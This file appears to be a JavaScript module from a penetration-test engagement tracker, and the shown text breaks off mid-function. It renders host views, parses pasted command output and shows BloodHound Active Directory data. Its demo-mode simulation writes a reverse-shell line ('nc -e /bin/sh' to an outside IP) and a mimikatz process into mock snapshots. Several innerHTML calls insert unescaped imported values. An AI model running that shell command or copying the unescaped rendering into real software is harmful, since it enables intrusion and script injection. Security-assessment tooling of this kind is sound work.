import { saveEngagementData, saveSnapshots, newSnapshot, newNote, isMockMode } from '../data/index.js';
import { btn } from '../ui/elements.js';
import { toastSuccess, toastError } from '../ui/toast.js';
import { detectOS, detectCommand,
         parseNetstat, parsePslist, parseIpconfig, parseUname, parseArp,
         parseNetUser, parseLocalAdmins, parseQwinsta, parsePasswd, parseShadow,
         parseLast, parseWhoamiAll, parseSudoL, parseNetAccounts, parseNetShare,
         parseADDomain, parseADDomainControllers, parseADTrusts, parseADOUs, parseADCS,
         parseEnv, parseSchtasks, parseCrontab, parseServices, parseRoutes,
         parseHostsFile, parseFirewall, parseBannerGrab, parseSuid, parseHistory, parseSoftware,
         diffSnapshots, checkParseQuality } from '../data/parsers.js';

export function renderHost(engagementId, hostId, data, snapshots, onBack, imports = []) {
  const container = document.getElementById('app-content');
  const host = data.hosts.find(h => h.id === hostId);
  if (!host) { onBack(); return; }

  let activeTab = 'current';
  let snapSort  = 'time'; // 'time' | 'type'

  render();

  function render() {
    container.innerHTML = '';

    // ── Header ────────────────────────────────────────────
    const header = document.createElement('div');
    header.className = 'flex items-start gap-4 mb-6';

    const titleBlock = document.createElement('div');
    titleBlock.className = 'flex-1 min-w-0';

    const breadcrumb = document.createElement('p');
    breadcrumb.className = 'text-xs text-slate-400 mb-1 cursor-pointer hover:text-indigo-400';
    breadcrumb.textContent = '← Back to engagement';
    breadcrumb.onclick = onBack;
    titleBlock.appendChild(breadcrumb);

    const ipEl = document.createElement('h2');
    ipEl.className = 'text-2xl font-bold font-mono text-slate-800';
    ipEl.textContent = host.ip;
    titleBlock.appendChild(ipEl);

    const metaEl = document.createElement('p');
    metaEl.className = 'text-sm text-slate-400 mt-0.5';
    metaEl.textContent = [host.hostname, host.os].filter(Boolean).join(' · ') || 'No hostname or OS recorded';
    titleBlock.appendChild(metaEl);

    header.appendChild(titleBlock);

    const headerActions = document.createElement('div');
    headerActions.className = 'flex items-center gap-3 flex-shrink-0 mt-1';

    const statusBadge = document.createElement('span');
    statusBadge.className = `badge badge-${host.status} cursor-pointer select-none`;
    statusBadge.textContent = host.status;
    statusBadge.title = 'Click to cycle status';
    statusBadge.onclick = async () => {
      const next = { observed: 'compromised', compromised: 'unknown', unknown: 'observed' };
      host.status = next[host.status] || 'observed';
      data.hosts = data.hosts.map(h => h.id === hostId ? host : h);
      try { await saveEngagementData(engagementId, data); render(); }
      catch { toastError('Could not update status.'); }
    };

    const addSnapBtn = btn('+ Snapshot', 'primary');
    addSnapBtn.onclick = () => showSnapshotForm();

    const addNoteBtn = btn('+ Note', 'ghost');
    addNoteBtn.onclick = () => { activeTab = 'notes'; showNoteForm(); };

    headerActions.appendChild(statusBadge);
    if (isMockMode()) {
      const simBtn = btn('⚡ Simulate', 'ghost');
      simBtn.title = 'Inject a simulated new snapshot to demo diff highlighting';
      simBtn.onclick = () => simulateNewData(hostSnaps);
      headerActions.appendChild(simBtn);
    }
    headerActions.appendChild(addNoteBtn);
    headerActions.appendChild(addSnapBtn);
    header.appendChild(headerActions);
    container.appendChild(header);

    // ── Stats row ─────────────────────────────────────────
    const hostSnaps = snapshots.filter(s => s.hostId === hostId).sort((a, b) => b.timestamp - a.timestamp);
    const hostNotes = (data.notes || []).filter(n => n.hostId === hostId).sort((a, b) => b.timestamp - a.timestamp);

    const statsRow = document.createElement('div');
    statsRow.className = 'grid grid-cols-4 gap-4 mb-6';

    const latestNetstat = hostSnaps.find(s => s.commandType === 'netstat');
    const listeningCount = latestNetstat?.parsed?.connections?.filter(c => c.state === 'LISTENING' || c.state === 'LISTEN').length ?? '—';
    const estCount = latestNetstat?.parsed?.connections?.filter(c => c.state === 'ESTABLISHED').length ?? '—';

    [
      { label: 'Snapshots', value: hostSnaps.length },
      { label: 'Notes', value: hostNotes.length },
      { label: 'Listening ports', value: listeningCount },
      { label: 'Established conns', value: estCount },
    ].forEach(({ label, value }) => {
      const card = document.createElement('div');
      card.className = 'bg-white rounded-xl border border-slate-200 px-4 py-3';
      const v = document.createElement('p');
      v.className = 'text-2xl font-bold text-slate-800';
      v.textContent = value;
      const l = document.createElement('p');
      l.className = 'text-xs text-slate-400 mt-0.5';
      l.textContent = label;
      card.appendChild(v);
      card.appendChild(l);
      statsRow.appendChild(card);
    });
    container.appendChild(statsRow);

    // ── Tabs ──────────────────────────────────────────────
    const tabBar = document.createElement('div');
    tabBar.className = 'flex gap-1 border-b border-slate-200 mb-4';

    [
      { id: 'current',     label: 'Latest State' },
      { id: 'snapshots',   label: `Snapshots (${hostSnaps.length})` },
      { id: 'notes',       label: `Notes (${hostNotes.length})` },
      { id: 'graph',       label: 'Graph' },
      { id: 'bloodhound',  label: 'BloodHound' },
    ].forEach(({ id, label }) => {
      const t = document.createElement('button');
      t.type = 'button';
      t.className = `px-4 py-2 text-sm font-medium border-b-2 -mb-px transition-colors ${
        activeTab === id
          ? 'border-indigo-600 text-indigo-600'
          : 'border-transparent text-slate-500 hover:text-slate-700'
      }`;
      t.textContent = label;
      t.onclick = () => { activeTab = id; render(); };
      tabBar.appendChild(t);
    });
    container.appendChild(tabBar);

    // ── Tab content ───────────────────────────────────────
    if (activeTab === 'current') {
      renderCurrentTab(hostSnaps);
    } else if (activeTab === 'snapshots') {
      renderSnapshotsTab(hostSnaps);
    } else if (activeTab === 'graph') {
      const graphContainer = document.createElement('div');
      container.appendChild(graphContainer);
      import('./renderHostGraph.js').then(({ renderHostGraph }) => {
        renderHostGraph(engagementId, host, graphContainer, hostSnaps, (targetHostId) => {
          renderHost(engagementId, targetHostId, data, snapshots, onBack, imports);
        });
      });
    } else if (activeTab === 'bloodhound') {
      renderBHTab();
    } else {
      renderNotesTab(hostNotes);
    }
  }

  // ── Snapshots tab ──────────────────────────────────────

  function renderSnapshotsTab(hostSnaps) {
    if (hostSnaps.length === 0) {
      const empty = document.createElement('p');
      empty.className = 'text-slate-400 text-sm text-center py-12';
      empty.textContent = 'No snapshots yet. Click "+ Snapshot" to paste command output.';
      container.appendChild(empty);
      return;
    }

    function renderSnapCard(snap, i, snapsArray) {
      const prevSnap = snapsArray.find((s, j) => j > i && s.commandType === snap.commandType);
      const diff = prevSnap ? diffSnapshots(prevSnap, snap) : null;
      const hasChanges = diff && (diff.added?.length || diff.removed?.length);

      const card = document.createElement('div');
      card.className = 'bg-white rounded-xl border border-slate-200 p-4 mb-3';

      // Snap header
      const snapHeader = document.createElement('div');
      snapHeader.className = 'flex items-center gap-3 mb-3';

      const cmdBadge = document.createElement('span');
      cmdBadge.className = 'inline-flex items-center px-2 py-0.5 rounded text-xs font-mono font-semibold bg-indigo-100 text-indigo-700';
      cmdBadge.textContent = snap.commandType;

      const osBadge = document.createElement('span');
      osBadge.className = 'inline-flex items-center px-2 py-0.5 rounded text-xs bg-slate-100 text-slate-600';
      osBadge.textContent = snap.osFamily;

      const tsBadge = document.createElement('span');
      tsBadge.className = 'text-xs text-slate-400 flex-1';
      tsBadge.textContent = new Date(snap.timestamp).toLocaleString();

      const delBtn = document.createElement('button');
      delBtn.type = 'button';
      delBtn.textContent = '×';
      delBtn.className = 'text-slate-300 hover:text-red-400 text-xl leading-none ml-auto';
      delBtn.onclick = async () => {
        const updated = snapshots.filter(s => s.id !== snap.id);
        try { await saveSnapshots(engagementId, updated); snapshots = updated; render(); }
        catch { toastError('Could not delete snapshot.'); }
      };

      snapHeader.appendChild(cmdBadge);
      snapHeader.appendChild(osBadge);
      snapHeader.appendChild(tsBadge);
      snapHeader.appendChild(delBtn);
      card.appendChild(snapHeader);

      // Parse quality warning
      const parseCheck = checkParseQuality(snap);
      if (!parseCheck.ok) {
        const warn = document.createElement('div');
        warn.className = 'flex items-start gap-2 bg-amber-50 border border-amber-200 rounded-lg px-3 py-2 mb-3 text-xs text-amber-700';
        warn.innerHTML = `<span class="flex-shrink-0">⚠</span><span><span class="font-medium">Parse warning:</span> ${parseCheck.warning}</span>`;
        card.appendChild(warn);
      }

      // Diff summary
      if (hasChanges) {
        const diffEl = document.createElement('div');
        diffEl.className = 'flex gap-2 mb-3 flex-wrap';

        if (diff.added?.length) {
          const el = document.createElement('div');
          el.className = 'diff-added rounded px-2 py-1 text-xs font-mono';
          el.textContent = `+${diff.added.length} new: ${formatDiffItems(snap.commandType, diff.added)}`;
          diffEl.appendChild(el);
        }
        if (diff.removed?.length) {
          const el = document.createElement('div');
          el.className = 'diff-removed rounded px-2 py-1 text-xs font-mono';
          el.textContent = `−${diff.removed.length} gone: ${formatDiffItems(snap.commandType, diff.removed)}`;
          diffEl.appendChild(el);
        }
        card.appendChild(diffEl);
      }

      // Parsed body
      renderParsedBody(card, snap);

      // Raw toggle
      const rawToggle = document.createElement('button');
      rawToggle.type = 'button';
      rawToggle.className = 'text-xs text-slate-400 hover:text-slate-600 mt-3 block';
      rawToggle.textContent = 'Show raw output';
      let rawVisible = false;
      const rawEl = document.createElement('pre');
      rawEl.className = 'bg-slate-50 rounded-lg p-3 mt-2 overflow-x-auto text-xs font-mono whitespace-pre hidden max-h-64 overflow-y-auto border border-slate-200';
      rawEl.textContent = snap.rawOutput;
      rawToggle.onclick = () => {
        rawVisible = !rawVisible;
        rawEl.classList.toggle('hidden', !rawVisible);
        rawToggle.textContent = rawVisible ? 'Hide raw output' : 'Show raw output';
      };
      card.appendChild(rawToggle);
      card.appendChild(rawEl);

      container.appendChild(card);
    }

    // Sort toggle
    const sortBar = document.createElement('div');
    sortBar.className = 'flex items-center gap-2 mb-4';
    const sortLabel = document.createElement('span');
    sortLabel.className = 'text-xs text-slate-500 font-medium';
    sortLabel.textContent = 'Sort:';
    sortBar.appendChild(sortLabel);
    for (const [val, label] of [['time', 'By time'], ['type', 'By type']]) {
      const b = document.createElement('button');
      b.type = 'button';
      b.textContent = label;
      b.className = `text-xs px-2.5 py-1 rounded border ${snapSort === val ? 'bg-indigo-600 text-white border-indigo-600' : 'bg-white text-slate-600 border-slate-200 hover:border-slate-400'}`;
      b.onclick = () => { snapSort = val; render(); };
      sortBar.appendChild(b);
    }
    container.appendChild(sortBar);

    if (snapSort === 'type') {
      // Group by commandType
      const groups = {};
      for (const snap of hostSnaps) {
        (groups[snap.commandType] ||= []).push(snap);
      }
      // Sort group keys by most recent snap in each group
      const sortedTypes = Object.keys(groups).sort(
        (a, b) => groups[b][0].timestamp - groups[a][0].timestamp
      );
      for (const type of sortedTypes) {
        const groupSnaps = groups[type];
        const heading = document.createElement('p');
        heading.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-2 mt-4 first:mt-0';
        heading.textContent = `${type}  (${groupSnaps.length})`;
        container.appendChild(heading);
        groupSnaps.forEach((snap, i) => renderSnapCard(snap, i, groupSnaps));
      }
      return;
    }

    hostSnaps.forEach((snap, i) => renderSnapCard(snap, i, hostSnaps));
  }

  // ── Notes tab ─────────────────────────────────────────

  function renderNotesTab(hostNotes) {
    if (hostNotes.length === 0) {
      const empty = document.createElement('p');
      empty.className = 'text-slate-400 text-sm text-center py-12';
      empty.textContent = 'No notes yet. Click "+ Note" to add one.';
      container.appendChild(empty);
      return;
    }

    hostNotes.forEach(note => {
      const card = document.createElement('div');
      card.className = 'bg-white rounded-xl border border-slate-200 px-4 py-3 mb-3';

      const topRow = document.createElement('div');
      topRow.className = 'flex items-center justify-between mb-2';

      const ts = document.createElement('span');
      ts.className = 'text-xs text-slate-400';
      ts.textContent = new Date(note.timestamp).toLocaleString();

      const delBtn = document.createElement('button');
      delBtn.type = 'button';
      delBtn.textContent = '×';
      delBtn.className = 'text-slate-300 hover:text-red-400 text-xl leading-none';
      delBtn.onclick = async () => {
        data.notes = data.notes.filter(n => n.id !== note.id);
        try { await saveEngagementData(engagementId, data); render(); }
        catch { toastError('Could not delete note.'); }
      };

      topRow.appendChild(ts);
      topRow.appendChild(delBtn);
      card.appendChild(topRow);

      const text = document.createElement('p');
      text.className = 'text-sm text-slate-700 whitespace-pre-wrap';
      text.textContent = note.text;
      card.appendChild(text);

      container.appendChild(card);
    });
  }

  // ── Snapshot form ──────────────────────────────────────

  function showSnapshotForm() {
    const backdrop = document.createElement('div');
    backdrop.className = 'modal-backdrop';

    const box = document.createElement('div');
    box.className = 'modal-box max-w-2xl';

    const title = document.createElement('h3');
    title.className = 'text-lg font-bold text-slate-800 mb-1';
    title.textContent = 'Paste Command Output';
    box.appendChild(title);

    const hint = document.createElement('p');
    hint.className = 'text-xs text-slate-400 mb-3';
    hint.textContent = 'Supports: netstat, ps/tasklist, ipconfig/ifconfig, uname, arp, net user, net localgroup administrators, qwinsta, /etc/passwd, /etc/shadow, last, whoami /all, sudo -l, net accounts, net share, Get-ADDomain/Forest, Get-ADDomainController/nltest, Get-ADTrust/nltest domain_trusts, Get-ADOrganizationalUnit/dsquery ou, certutil -CA. OS and command type detected automatically.';
    box.appendChild(hint);

    const textarea = document.createElement('textarea');
    textarea.className = 'field-mono mb-1 resize-none';
    textarea.rows = 16;
    textarea.placeholder = 'Paste raw output here…';
    box.appendChild(textarea);

    const detected = document.createElement('p');
    detected.className = 'text-xs text-slate-400 mb-3 h-4';
    box.appendChild(detected);

    textarea.oninput = () => {
      const raw = textarea.value;
      if (raw.trim()) {
        const os  = detectOS(raw);
        const cmd = detectCommand(raw);
        detected.textContent = `Detected: ${cmd} on ${os}`;
      } else {
        detected.textContent = '';
      }
    };

    const actions = document.createElement('div');
    actions.className = 'flex gap-3';

    const saveBtn = btn('Save Snapshot', 'primary');
    saveBtn.className += ' flex-1';
    saveBtn.onclick = async () => {
      const raw = textarea.value.trim();
      if (!raw) { textarea.focus(); return; }
      saveBtn.disabled = true;

      const osFamily  = detectOS(raw);
      const cmdType   = detectCommand(raw);

      let parsed = null;
      try {
        if (cmdType === 'netstat')     parsed = parseNetstat(raw, osFamily);
        if (cmdType === 'pslist')      parsed = parsePslist(raw, osFamily);
        if (cmdType === 'ipconfig')    parsed = parseIpconfig(raw, osFamily);
        if (cmdType === 'uname')       parsed = parseUname(raw);
        if (cmdType === 'arp')         parsed = parseArp(raw);
        if (cmdType === 'netuser')     parsed = parseNetUser(raw);
        if (cmdType === 'localadmins') parsed = parseLocalAdmins(raw);
        if (cmdType === 'sessions')    parsed = parseQwinsta(raw);
        if (cmdType === 'passwd')      parsed = parsePasswd(raw);
        if (cmdType === 'shadow')      parsed = parseShadow(raw);
        if (cmdType === 'lastlog')     parsed = parseLast(raw);
        if (cmdType === 'whoami')      parsed = parseWhoamiAll(raw);
        if (cmdType === 'sudol')       parsed = parseSudoL(raw);
        if (cmdType === 'netaccounts')        parsed = parseNetAccounts(raw);
        if (cmdType === 'netshare')           parsed = parseNetShare(raw);
        if (cmdType === 'addomain')           parsed = parseADDomain(raw);
        if (cmdType === 'addomaincontrollers') parsed = parseADDomainControllers(raw);
        if (cmdType === 'adtrusts')           parsed = parseADTrusts(raw);
        if (cmdType === 'adous')              parsed = parseADOUs(raw);
        if (cmdType === 'adcs')               parsed = parseADCS(raw);
        if (cmdType === 'env')                parsed = parseEnv(raw);
        if (cmdType === 'schtasks')           parsed = parseSchtasks(raw);
        if (cmdType === 'crontab')            parsed = parseCrontab(raw);
        if (cmdType === 'services')           parsed = parseServices(raw);
        if (cmdType === 'routes')             parsed = parseRoutes(raw);
        if (cmdType === 'hostsfile')          parsed = parseHostsFile(raw);
        if (cmdType === 'firewall')           parsed = parseFirewall(raw);
        if (cmdType === 'bannergrab')         parsed = parseBannerGrab(raw);
        if (cmdType === 'suid')               parsed = parseSuid(raw);
        if (cmdType === 'history')            parsed = parseHistory(raw);
        if (cmdType === 'software')           parsed = parseSoftware(raw);
      } catch (e) { console.warn('Parse error:', e); }

      const snap = newSnapshot({ hostId, commandType: cmdType, osFamily, rawOutput: raw, parsed });

      if (osFamily !== 'unknown' && (!host.osFamily || host.osFamily === 'unknown')) {
        host.osFamily = osFamily;
        data.hosts = data.hosts.map(h => h.id === hostId ? host : h);
      }

      try {
        const updatedSnaps = [snap, ...snapshots];
        await Promise.all([
          saveSnapshots(engagementId, updatedSnaps),
          saveEngagementData(engagementId, data),
        ]);
        snapshots = updatedSnaps;
        toastSuccess('Snapshot saved.');
        backdrop.remove();
        render();
      } catch (err) {
        toastError(err.message || 'Could not save.');
        saveBtn.disabled = false;
      }
    };

    const cancelBtn = btn('Cancel', 'ghost');
    cancelBtn.onclick = () => backdrop.remove();

    actions.appendChild(saveBtn);
    actions.appendChild(cancelBtn);
    box.appendChild(actions);

    backdrop.appendChild(box);
    backdrop.onclick = e => { if (e.target === backdrop) backdrop.remove(); };
    document.body.appendChild(backdrop);
    textarea.focus();
  }

  // ── Note form ─────────────────────────────────────────

  function showNoteForm() {
    const backdrop = document.createElement('div');
    backdrop.className = 'modal-backdrop';

    const box = document.createElement('div');
    box.className = 'modal-box';

    const title = document.createElement('h3');
    title.className = 'text-lg font-bold text-slate-800 mb-3';
    title.textContent = 'Add Note';
    box.appendChild(title);

    const textarea = document.createElement('textarea');
    textarea.className = 'field mb-4 resize-none';
    textarea.rows = 5;
    textarea.placeholder = 'What happened on this host…';
    box.appendChild(textarea);

    const actions = document.createElement('div');
    actions.className = 'flex gap-3';

    const saveBtn = btn('Add Note', 'primary');
    saveBtn.className += ' flex-1';
    saveBtn.onclick = async () => {
      const text = textarea.value.trim();
      if (!text) return;
      saveBtn.disabled = true;
      data.notes = [...(data.notes || []), newNote({ hostId, text })];
      try {
        await saveEngagementData(engagementId, data);
        backdrop.remove();
        render();
      } catch (err) {
        toastError(err.message || 'Could not save.');
        saveBtn.disabled = false;
      }
    };

    const cancelBtn = btn('Cancel', 'ghost');
    cancelBtn.onclick = () => backdrop.remove();
    actions.appendChild(saveBtn);
    actions.appendChild(cancelBtn);
    box.appendChild(actions);

    backdrop.appendChild(box);
    backdrop.onclick = e => { if (e.target === backdrop) backdrop.remove(); };
    document.body.appendChild(backdrop);
    textarea.focus();
  }

  // ── Current State tab ──────────────────────────────────

  function renderCurrentTab(hostSnaps) {
    if (hostSnaps.length === 0) {
      const empty = document.createElement('p');
      empty.className = 'text-slate-400 text-sm text-center py-12';
      empty.textContent = 'No snapshots yet. Click "+ Snapshot" to paste command output.';
      container.appendChild(empty);
      return;
    }

    // One card per commandType, ordered by security relevance
    const ORDER = ['netstat','pslist','localadmins','shadow','whoami','sudol','sessions',
                   'passwd','netaccounts','netshare','lastlog','ipconfig','uname','arp','netuser',
                   'env','history','schtasks','crontab','services','routes','hostsfile','firewall','bannergrab','suid','software',
                   'addomain','addomaincontrollers','adtrusts','adous','adcs'];
    const latest = {};
    for (const snap of hostSnaps) {
      if (!latest[snap.commandType]) latest[snap.commandType] = snap;
    }
    const types = [
      ...ORDER.filter(t => latest[t]),
      ...Object.keys(latest).filter(t => !ORDER.includes(t)),
    ];

    const WIDE = new Set(['addomain','addomaincontrollers','adtrusts','adous','firewall']);
    const grid = document.createElement('div');
    grid.className = 'grid grid-cols-2 gap-3 items-start';

    for (const type of types) {
      const snap = latest[type];
      const card = document.createElement('div');
      card.className = 'bg-white rounded-xl border border-slate-200 p-4' + (WIDE.has(type) ? ' col-span-2' : '');

      const cardHeader = document.createElement('div');
      cardHeader.className = 'flex items-center gap-2 mb-3';

      const cmdBadge = document.createElement('span');
      cmdBadge.className = 'inline-flex items-center px-2 py-0.5 rounded text-xs font-mono font-semibold bg-indigo-100 text-indigo-700';
      cmdBadge.textContent = type;

      const osBadge = document.createElement('span');
      osBadge.className = 'inline-flex items-center px-2 py-0.5 rounded text-xs bg-slate-100 text-slate-600';
      osBadge.textContent = snap.osFamily;

      const ts = document.createElement('span');
      ts.className = 'text-xs text-slate-400 ml-auto';
      ts.textContent = new Date(snap.timestamp).toLocaleString();

      const viewBtn = document.createElement('button');
      viewBtn.type = 'button';
      viewBtn.className = 'text-xs text-indigo-500 hover:text-indigo-700 ml-2';
      viewBtn.textContent = 'history →';
      viewBtn.onclick = () => { activeTab = 'snapshots'; snapSort = 'type'; render(); };

      cardHeader.appendChild(cmdBadge);
      cardHeader.appendChild(osBadge);
      cardHeader.appendChild(ts);
      cardHeader.appendChild(viewBtn);
      card.appendChild(cardHeader);

      const parseCheck = checkParseQuality(snap);
      if (!parseCheck.ok) {
        const warn = document.createElement('div');
        warn.className = 'flex items-start gap-2 bg-amber-50 border border-amber-200 rounded-lg px-3 py-2 mb-3 text-xs text-amber-700';
        warn.innerHTML = `<span class="flex-shrink-0">⚠</span><span><span class="font-medium">Parse warning:</span> ${parseCheck.warning}</span>`;
        card.appendChild(warn);
      }

      if (snap.parsed) {
        renderParsedBody(card, snap);
      } else {
        const na = document.createElement('p');
        na.className = 'text-xs text-slate-400 italic';
        na.textContent = 'No parsed data.';
        card.appendChild(na);
      }

      grid.appendChild(card);
    }
    container.appendChild(grid);
  }

  // ── Simulate new data (mock/demo mode only) ────────────

  function simulateNewData(hostSnaps) {
    const netstatSnap = hostSnaps.find(s => s.commandType === 'netstat');
    const pslistSnap  = hostSnaps.find(s => s.commandType === 'pslist');

    if (!netstatSnap && !pslistSnap) {
      toastError('Need at least one netstat or pslist snapshot to simulate from.');
      return;
    }

    const newSnaps = [];

    if (netstatSnap) {
      const line = host.osFamily === 'windows'
        ? `\n  TCP    ${host.ip}:49712      185.220.101.34:443     ESTABLISHED`
        : `\ntcp        0      0 ${host.ip}:49712   185.220.101.34:443   ESTABLISHED`;
      const raw    = netstatSnap.rawOutput + line;
      const parsed = parseNetstat(raw, host.osFamily);
      newSnaps.push(newSnapshot({ hostId, commandType: 'netstat', osFamily: host.osFamily, rawOutput: raw, parsed }));
    }

    if (pslistSnap) {
      const line = host.osFamily === 'windows'
        ? '\nmimikatz.exe                 4444   4780'
        : '\nwww-data  9988  0.0  0.0  4196  1024 pts/2    S    14:22   0:00 nc -e /bin/sh 185.220.101.34 4444';
      const raw    = pslistSnap.rawOutput + line;
      const parsed = parsePslist(raw, host.osFamily);
      newSnaps.push(newSnapshot({ hostId, commandType: 'pslist', osFamily: host.osFamily, rawOutput: raw, parsed }));
    }

    const updated = [...newSnaps, ...snapshots];
    saveSnapshots(engagementId, updated)
      .then(() => {
        snapshots = updated;
        activeTab = 'snapshots';
        snapSort  = 'type';
        toastSuccess(`Simulated ${newSnaps.length} new snapshot${newSnaps.length !== 1 ? 's' : ''} — diffs highlighted below.`);
        render();
      })
      .catch(e => toastError(e.message || 'Simulation failed.'));
  }

  // ── BloodHound tab ─────────────────────────────────────

  function renderBHTab() {
    // Find the most recent SharpHound import with a matching computer entry
    const shImports = (imports || [])
      .filter(i => i.importType === 'sharphound' && i.parsed)
      .sort((a, b) => b.importedAt - a.importedAt);

    const hostname = (host.hostname || '').toLowerCase().split('.')[0];

    let bhComputer = null;
    let bhParsed   = null;
    for (const imp of shImports) {
      const match = (imp.parsed.computers || []).find(c => {
        const bhShort = (c.name || '').toLowerCase().split('.')[0];
        return bhShort && bhShort === hostname;
      });
      if (match) { bhComputer = match; bhParsed = imp.parsed; break; }
    }

    const wrap = document.createElement('div');
    wrap.className = 'space-y-4';

    if (!bhComputer) {
      const empty = document.createElement('div');
      empty.className = 'bg-white rounded-xl border border-slate-200 px-6 py-10 text-center';
      empty.innerHTML = `<p class="text-slate-400 text-sm">No matching BloodHound computer found for hostname <span class="font-mono">${host.hostname || host.ip}</span>.</p><p class="text-slate-300 text-xs mt-1">Import a SharpHound ZIP from the Overview tab to populate this section.</p>`;
      wrap.appendChild(empty);
      container.appendChild(wrap);
      return;
    }

    // Build SID → name lookup from all BH object types
    const sidToName = {};
    for (const u of bhParsed.users     || []) if (u.objectId && u.name)     sidToName[u.objectId] = u.name;
    for (const g of bhParsed.groups    || []) if (g.objectId && g.name)     sidToName[g.objectId] = g.name;
    for (const c of bhParsed.computers || []) if (c.objectId && c.name)     sidToName[c.objectId] = c.name;
    for (const d of bhParsed.domains   || []) if (d.objectId && d.name)     sidToName[d.objectId] = d.name;

    function resolveSid(sid) {
      return sidToName[sid] || sid;
    }

    // ── Properties card ──
    const propsCard = bhCard('Computer Properties');
    const props = [
      { label: 'Domain Controller', value: bhComputer.isDC    ? 'Yes' : 'No', highlight: bhComputer.isDC    ? 'text-blue-600 font-semibold'   : '' },
      { label: 'LAPS Deployed',     value: bhComputer.hasLAPS ? 'Yes' : 'No', highlight: bhComputer.hasLAPS ? 'text-green-600 font-semibold'  : 'text-red-500' },
      { label: 'OS',                value: bhComputer.os || '—',               highlight: '' },
      { label: 'Domain',            value: bhComputer.domain || '—',           highlight: '' },
      { label: 'Enabled',           value: bhComputer.enabled ? 'Yes' : 'No',  highlight: '' },
      { label: 'Unconstrained Delegation', value: bhComputer.unconstrainedDelegation ? 'YES' : 'No', highlight: bhComputer.unconstrainedDelegation ? 'text-red-600 font-semibold' : '' },
      { label: 'Constrained Delegation',   value: bhComputer.trustedToAuth           ? 'Yes' : 'No', highlight: bhComputer.trustedToAuth           ? 'text-orange-600 font-semibold' : '' },
    ];
    const propGrid = document.createElement('div');
    propGrid.className = 'grid grid-cols-2 gap-x-8 gap-y-2 text-sm';
    props.forEach(({ label, value, highlight }) => {
      const row = document.createElement('div');
      row.className = 'flex justify-between border-b border-slate-50 py-1';
      row.innerHTML = `<span class="text-slate-500">${label}</span><span class="font-mono text-right ${highlight || 'text-slate-800'}">${value}</span>`;
      propGrid.appendChild(row);
    });
    propsCard.appendChild(propGrid);
    wrap.appendChild(propsCard);

    // ── Sessions card ──
    const sessions = bhComputer.sessions || [];
    const sessCard = bhCard(`Sessions (${sessions.length})`);
    if (sessions.length === 0) {
      sessCard.appendChild(bhEmpty('No sessions collected.'));
    } else {
      const list = document.createElement('div');
      list.className = 'space-y-1';
      sessions.forEach(s => {
        const name = resolveSid(s.userId);
        const row = document.createElement('div');
        row.className = 'flex items-center justify-between text-sm py-1 border-b border-slate-50';
        const srcBadge = s.source === 'privileged' ? '<span class="ml-2 px-1.5 py-0.5 rounded text-xs bg-red-100 text-red-700">privileged</span>' : '';
        row.innerHTML = `<span class="font-mono text-slate-700 truncate">${name}</span>${srcBadge}`;
        list.appendChild(row);
      });
      sessCard.appendChild(list);
    }
    wrap.appendChild(sessCard);

    // ── Local Admins card ──
    const localAdmins = bhComputer.localAdmins || [];
    const adminCard = bhCard(`Local Admins (${localAdmins.length})`);
    if (localAdmins.length === 0) {
      adminCard.appendChild(bhEmpty('No local admins collected.'));
    } else {
      const list = document.createElement('div');
      list.className = 'space-y-1';
      localAdmins.forEach(sid => {
        const row = document.createElement('div');
        row.className = 'text-sm font-mono text-slate-700 py-1 border-b border-slate-50 truncate';
        row.textContent = resolveSid(sid);
        list.appendChild(row);
      });
      adminCard.appendChild(list);
    }
    wrap.appendChild(adminCard);

    // ── Notable ACEs card ──
    const notableRights = new Set(['DCSync','GenericAll','GenericWrite','WriteDACL','WriteOwner','AllExtendedRights','Owns','ForceChangePassword','AddMember','ReadLAPSPassword','ReadGMSAPassword','AddKeyCredentialLink','AllowedToAct']);
    const myAces = (bhParsed.aces || []).filter(a =>
      a.objectSid === bhComputer.objectId && notableRights.has(a.rightName)
    );
    const aceCard = bhCard(`Notable ACEs on this host (${myAces.length})`);
    if (myAces.length === 0) {
      aceCard.appendChild(bhEmpty('No notable ACEs found.'));
    } else {
      const tbl = document.createElement('table');
      tbl.className = 'w-full text-sm';
      tbl.innerHTML = '<thead><tr class="text-left text-xs text-slate-400 border-b border-slate-100"><th class="py-1.5 pr-4 font-medium">Principal</th><th class="py-1.5 pr-4 font-medium">Type</th><th class="py-1.5 font-medium">Right</th></tr></thead>';
      const tbody = document.createElement('tbody');
      myAces.forEach(a => {
        const tr = document.createElement('tr');
        tr.className = 'border-b border-slate-50';
        const rightClass = ['GenericAll','DCSync','AllExtendedRights'].includes(a.rightName) ? 'text-red-600 font-semibold' : 'text-orange-600';
        tr.innerHTML = `<td class="py-1.5 pr-4 font-mono text-slate-700 truncate max-w-xs">${resolveSid(a.principalSid)}</td><td class="py-1.5 pr-4 text-slate-500">${a.principalType || '—'}</td><td class="py-1.5 ${rightClass}">${a.rightName}</td>`;
        tbody.appendChild(tr);
      });
      tbl.appendChild(tbody);
      aceCard.appendChild(tbl);
    }
    wrap.appendChild(aceCard);

    container.appendChild(wrap);
  }

  function bhCard(title) {
    const card = document.createElement('div');
    card.className = 'bg-white rounded-xl border border-slate-200 p-5';
    const h = document.createElement('h3');
    h.className = 'text-sm font-semibold text-slate-700 mb-3';
    h.textContent = title;
    card.appendChild(h);
    return card;
  }

  function bhEmpty(msg) {
    const p = document.createElement('p');
    p.className = 'text-slate-400 text-sm italic';
    p.textContent = msg;
    return p;
  }
}

// ── Parsed body renderers ─────────────────────────────────

function renderParsedBody(card, snap) {
  if (!snap.parsed) return;

  if (snap.commandType === 'netstat') {
    const conns = snap.parsed.connections || [];
    const listening = conns.filter(c => c.state === 'LISTENING' || c.state === 'LISTEN');
    const established = conns.filter(c => c.state === 'ESTABLISHED');

    if (listening.length) {
      const section = document.createElement('div');
      section.className = 'mb-3';
      const label = document.createElement('p');
      label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
      label.textContent = `Listening (${listening.length})`;
      section.appendChild(label);
      const pills = document.createElement('div');
      pills.className = 'flex flex-wrap gap-1.5';
      listening.forEach(c => {
        const pill = document.createElement('span');
        pill.className = 'inline-block px-2 py-0.5 rounded bg-blue-50 text-blue-700 text-xs font-mono';
        pill.textContent = `${c.proto} :${c.localPort}`;
        pills.appendChild(pill);
      });
      section.appendChild(pills);
      card.appendChild(section);
    }

    if (established.length) {
      const section = document.createElement('div');
      section.className = 'mb-1';
      const label = document.createElement('p');
      label.className = 'text-xs font-semibold text-slate-500 uppercase tracking-wider mb-1';
      label.textContent = `Established (${established.length})`;
      section.appendChild(label);
      const table = document.createElement('table');
      table.className = 'w-auto text-xs font-mono';
      established.slice(0, 10).forEach(c => {
